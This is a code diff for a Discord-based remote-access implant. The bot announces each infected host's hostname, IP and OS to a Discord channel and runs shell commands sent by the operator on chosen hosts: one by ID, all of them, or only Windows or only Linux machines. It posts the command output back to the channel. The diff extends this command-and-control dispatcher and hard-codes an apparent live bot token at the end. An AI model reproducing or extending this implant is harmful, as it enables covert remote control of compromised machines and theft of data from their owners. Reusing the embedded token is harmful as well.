@@ -2,6 +2,7 @@ import time
 from subprocess import check_output
 import uuid
 import socket
+import os
 import discord
 from discord.ext import commands
 
@@ -40,6 +41,15 @@ async def reply_thread(ctx, msg):
 	else:
 		await thread.send(msg)
 
+async def reply_thread_once(ctx, msg):
+	thread = None
+	try:
+		thread = await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}')
+	except:
+		return
+
+	await thread.send(msg)
+
 def run_cmd(cmd):
 	return check_output(cmd, shell=True).decode()
 
@@ -64,6 +74,7 @@ async def on_ready():
 	msg += f'| ID: `{uuid}`\n'
 	msg += f'| Hostname: `{hostname}`'
 	msg += f'| IP: `{ip}`\n'
+	msg += f'| OS: `{"Windows" if os.name == 'nt' else "Linux"}`\n'
 	msg += f'--------------------------------------------------'
 	log_msg(f'General channel id: {general_id}')
 	await general_channel.send(msg)
@@ -79,45 +90,101 @@ async def on_message(message):
 @bot.command()
 async def ping(ctx):
 	'''
-	This text will be shown in the help command
+	Get the latency of the bot
 	'''
 
-	# Get the latency of the bot
 	latency = bot.latency  # Included in the Discord.py library
 	# Send it to the user
 	await ctx.send(f'Current latency: {latency}s')
 
+# actually run the command
+async def _cmd(ctx, arg):
+	log_msg(f'{implant_id} Command recieved: {arg}')
+	await reply_thread(ctx, f'ID: {implant_id} Command recieved: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')
+
+# individual
+async def i_cmd(ctx, arg):
+	global implant_id
+	imp_id = arg[:8]
+	if not imp_id == implant_id:
+		return
+
+	arg = arg[9:]
+
+	await _cmd(ctx, arg)
+
+# all
+async def a_cmd(ctx, arg):
+	await _cmd(ctx, arg)
+
+# windows
+async def w_cmd(ctx, arg):
+	if not os.name == 'nt':
+		return
+	await _cmd(ctx, arg)
+
+# linux
+async def l_cmd(ctx, arg):
+	if not os.name == 'posix':
+		return
+	await _cmd(ctx, arg)
+
+# process commands
 @bot.command(rest_is_raw=True)
 async def cmd(ctx, *, arg):
 	'''
+	Run a command on a/multiple implants
+
 	>cmd -i [implant_id] [command]
 		specific implant
 	>cmd -a [command]
 		all implants
-	(future) >cmd -w [command]
+	>cmd -w [command]
 		windows implants
-	(future) >cmd -l [command]
+	>cmd -l [command]
 		linux implants
 	'''
+	
 	arg = arg[1::]
+
 	log_msg(f'Command recieved: {arg}')
-	await send_msg(ctx, f'Command sent: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')
+
+	flag = arg[:2]
+	log_msg(f'Flag: {flag}')
+
+	match flag:
+		case "-i":
+			await i_cmd(ctx, arg[3:])
+		case "-a":
+			await a_cmd(ctx, arg[3:])
+		case "-w":
+			await w_cmd(ctx, arg[3:])
+		case "-l":
+			await l_cmd(ctx, arg[3:])
+		case _:
+			await reply_thread_once(ctx, f'Unknown flag `{flag}` received, please try again.')
+
 	log_msg(f'Finished processing command: {arg}')
 
 @bot.command()
 async def change_id(ctx, arg1, arg2):
+	'''
+	Change the ID of an implant
+	'''
+
 	global implant_id
 	if not arg1 == implant_id:
 		return
 	log_msg(f'Changing implant id from {implant_id} to {arg2}')
-	await send_msg(ctx, f'Changing implant `{implant_id}` id to `{arg2}`')
+	await reply_thread_once(ctx, f'Changing implant `{implant_id}` id to `{arg2}`')
 	implant_id = arg2
 
 @bot.command()
 async def sessions(ctx):
-	#global hostname
-	#global ip
-	#await send_msg(ctx, f'ID: `{implant_id}` | HN: `{hostname}` | IP: `{ip}`')
-	await reply_thread(ctx, f'ID: `{implant_id}` | HN: `{hostname}` | IP: `{ip}`')
+	'''
+	List the active sessions
+	'''
+
+	await reply_thread(ctx, f'ID: `{implant_id}` | HN: `{hostname}` | IP: `{ip}` | OS: `{"W" if os.name == 'nt' else "L"}`')
 
 bot.run("MTI3NTgyNTA2MTM3ODY1ODM2Nw.G1e8mP.3hhbRTZ6dpz8oefx5bxB9MOtBbA4KB2a6-TBHs")  # Where 'TOKEN' is your bot token
